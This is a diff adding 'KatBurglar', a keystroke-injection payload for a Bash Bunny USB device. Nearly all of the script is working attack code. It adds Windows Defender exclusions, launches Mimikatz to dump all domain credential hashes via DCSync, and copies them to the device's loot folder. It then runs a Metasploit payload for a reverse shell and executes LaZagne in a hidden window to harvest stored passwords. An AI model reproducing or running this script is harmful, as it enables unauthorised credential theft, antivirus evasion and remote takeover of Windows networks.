@@ -1,0 +1,89 @@
+############################################################################################
+# Name: KatBurglar
+# Purpose: Disable Windows Defender, DCSync With Mimikatz, Run Lazagne, Get A Reverse Shell.
+# Version: 1.0
+# Author: assume-breach
+# Contact: twitter.com/assume-breach
+# Based on PasswordGrabber by jdebetaz, Hak5Darren, AlessandroZ, TeCHemically, dragmus13, RazerBlade
+# Date: 2022-03-12
+#############################################################################################
+
+#!/bin/bash
+
+# Options
+LOOTDIR=/root/udisk/loot/KatBurglar
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+DUCKY_LANGUAGE us
+
+######## MAKE LOOT DIRECTORY ########
+mkdir -p $LOOTDIR
+
+####### ATTACK ######
+Q GUI m
+Q DELAY 500
+Q GUI r
+Q DELAY 500
+Q STRING "powershell Start-Process powershell -Verb runAs"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q LEFTARROW
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING "powershell  Set-MpPreference -ExclusionPath ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\mimikatz.exe')" 
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING "Start-Process -FilePath ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\mimikatz.exe')"
+Q DELAY 750
+Q ENTER
+Q DELAY 2000
+Q STRING "privilege::debug"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING "token::elevate"
+Q DELAY 500
+Q ENTER
+Q STRING log hash.txt 
+Q DELAY 500
+Q ENTER
+Q DELAY 1000
+Q STRING "lsadump::dcsync /all /csv"
+Q ENTER
+Q DELAY 750
+Q STRING exit
+Q DELAY 500
+Q ENTER
+Q DELAY 750
+Q STRING "mv C:\Windows\System32\hash.txt ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\KatBurglar\hash.txt')"
+Q DELAY 500
+Q ENTER
+Q DELAY 1000
+
+#REPLACE MSF.EXE WITH YOUR OWN PAYLOAD OR COMMENT OUT!
+
+Q STRING "powershell  Set-MpPreference -ExclusionPath ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\MSF.EXE')"
+Q DELAY 500
+Q ENTER
+Q DELAY 500 
+Q STRING "powershell -ExecutionPolicy Bypass ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\MSF.exe')"
+Q DELAY 750
+Q ENTER
+Q DELAY 1750
+Q STRING "Set-MpPreference -ExclusionPath ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\lazagne.exe')"
+Q DELAY 500
+Q ENTER
+Q DELAY 100
+Q STRING "powershell -WindowStyle Hidden -ExecutionPolicy Bypass ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\lazpayload.ps1')"
+Q DELAY 750
+Q ENTER
+Q DELAY 100
+Q GUI m
+sleep 15
+LED FINISH
